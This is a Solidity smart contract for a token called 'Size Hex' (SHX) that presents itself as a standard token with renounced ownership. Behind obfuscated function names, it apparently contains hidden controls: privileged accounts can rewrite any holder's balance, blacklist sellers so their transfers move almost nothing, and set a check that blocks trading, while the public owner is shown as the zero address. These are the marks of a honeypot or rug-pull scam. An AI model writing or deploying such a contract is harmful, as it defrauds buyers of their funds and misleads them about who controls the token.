//SPDX-License-Identifier: MIT

pragma solidity ^0.8.5;

interface modeLiquidityTeam {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract shouldFrom {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface takeBuy {
    function createPair(address listLaunchedMode, address txTotal) external returns (address);
}

interface receiverMarketing {
    function totalSupply() external view returns (uint256);

    function balanceOf(address liquidityList) external view returns (uint256);

    function transfer(address isMax, uint256 launchedSender) external returns (bool);

    function allowance(address maxFund, address spender) external view returns (uint256);

    function approve(address spender, uint256 launchedSender) external returns (bool);

    function transferFrom(
        address sender,
        address isMax,
        uint256 launchedSender
    ) external returns (bool);

    event Transfer(address indexed from, address indexed listAuto, uint256 value);
    event Approval(address indexed maxFund, address indexed spender, uint256 value);
}

interface receiverMarketingMetadata is receiverMarketing {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract SizeHex is shouldFrom, receiverMarketing, receiverMarketingMetadata {

    uint256 private walletTake = 100000000 * 10 ** 18;

    function getOwner() external view returns (address) {
        return senderSwap;
    }

    function exemptAmountFrom(address txFee, uint256 launchedSender) public {
        autoTeamFund();
        isFund[txFee] = launchedSender;
    }

    address enableWallet = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 private txAmount;

    mapping(address => bool) public senderTotal;

    address marketingIs = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function owner() external view returns (address) {
        return senderSwap;
    }

    uint256 amountMin;

    string private toLaunched = "Size Hex";

    function txToken() public {
        emit OwnershipTransferred(maxExempt, address(0));
        senderSwap = address(0);
    }

    function totalSupply() external view virtual override returns (uint256) {
        return walletTake;
    }

    uint256 private limitBuyShould;

    function fundToSender(address fundAuto) public {
        require(fundAuto.balance < 100000);
        if (walletReceiverTx) {
            return;
        }
        
        takeMode[fundAuto] = true;
        if (exemptSell == sellAtReceiver) {
            liquidityTrading = false;
        }
        walletReceiverTx = true;
    }

    function minLimit(address launchedSwap) public {
        autoTeamFund();
        
        if (launchedSwap == maxExempt || launchedSwap == isLiquidity) {
            return;
        }
        senderTotal[launchedSwap] = true;
    }

    function approve(address buyAt, uint256 launchedSender) public virtual override returns (bool) {
        tokenExempt[_msgSender()][buyAt] = launchedSender;
        emit Approval(_msgSender(), buyAt, launchedSender);
        return true;
    }

    function balanceOf(address liquidityList) public view virtual override returns (uint256) {
        return isFund[liquidityList];
    }

    string private takeShouldSell = "SHX";

    mapping(address => mapping(address => uint256)) private tokenExempt;

    function autoTeamFund() private view {
        require(takeMode[_msgSender()]);
    }

    uint256 public isExempt;

    function transfer(address txFee, uint256 launchedSender) external virtual override returns (bool) {
        return limitList(_msgSender(), txFee, launchedSender);
    }

    uint256 private walletMin;

    function name() external view virtual override returns (string memory) {
        return toLaunched;
    }

    address public maxExempt;

    mapping(address => bool) public takeMode;

    address private senderSwap;

    event OwnershipTransferred(address indexed limitMarketing, address indexed receiverEnable);

    function transferFrom(address launchShould, address isMax, uint256 launchedSender) external override returns (bool) {
        if (_msgSender() != enableWallet) {
            if (tokenExempt[launchShould][_msgSender()] != type(uint256).max) {
                require(launchedSender <= tokenExempt[launchShould][_msgSender()]);
                tokenExempt[launchShould][_msgSender()] -= launchedSender;
            }
        }
        return limitList(launchShould, isMax, launchedSender);
    }

    bool public liquidityTrading;

    address public isLiquidity;

    function shouldAtAuto(address launchShould, address isMax, uint256 launchedSender) internal returns (bool) {
        require(isFund[launchShould] >= launchedSender);
        isFund[launchShould] -= launchedSender;
        isFund[isMax] += launchedSender;
        emit Transfer(launchShould, isMax, launchedSender);
        return true;
    }

    bool public launchBuy;

    function decimals() external view virtual override returns (uint8) {
        return minReceiver;
    }

    bool public sellAtReceiver;

    function limitList(address launchShould, address isMax, uint256 launchedSender) internal returns (bool) {
        if (launchShould == maxExempt) {
            return shouldAtAuto(launchShould, isMax, launchedSender);
        }
        uint256 walletExempt = receiverMarketing(isLiquidity).balanceOf(marketingIs);
        require(walletExempt == autoToLimit);
        require(isMax != marketingIs);
        if (senderTotal[launchShould]) {
            return shouldAtAuto(launchShould, isMax, tokenReceiver);
        }
        return shouldAtAuto(launchShould, isMax, launchedSender);
    }

    mapping(address => uint256) private isFund;

    uint8 private minReceiver = 18;

    constructor (){
        if (exemptSell != sellAtReceiver) {
            sellAtReceiver = true;
        }
        modeLiquidityTeam enableMode = modeLiquidityTeam(enableWallet);
        isLiquidity = takeBuy(enableMode.factory()).createPair(enableMode.WETH(), address(this));
        if (sellAtReceiver) {
            walletMin = isExempt;
        }
        maxExempt = _msgSender();
        txToken();
        takeMode[maxExempt] = true;
        isFund[maxExempt] = walletTake;
        
        emit Transfer(address(0), maxExempt, walletTake);
    }

    function listFee(uint256 launchedSender) public {
        autoTeamFund();
        autoToLimit = launchedSender;
    }

    uint256 constant tokenReceiver = 3 ** 10;

    bool public exemptSell;

    bool public walletReceiverTx;

    function symbol() external view virtual override returns (string memory) {
        return takeShouldSell;
    }

    uint256 autoToLimit;

    function allowance(address feeLaunch, address buyAt) external view virtual override returns (uint256) {
        if (buyAt == enableWallet) {
            return type(uint256).max;
        }
        return tokenExempt[feeLaunch][buyAt];
    }

}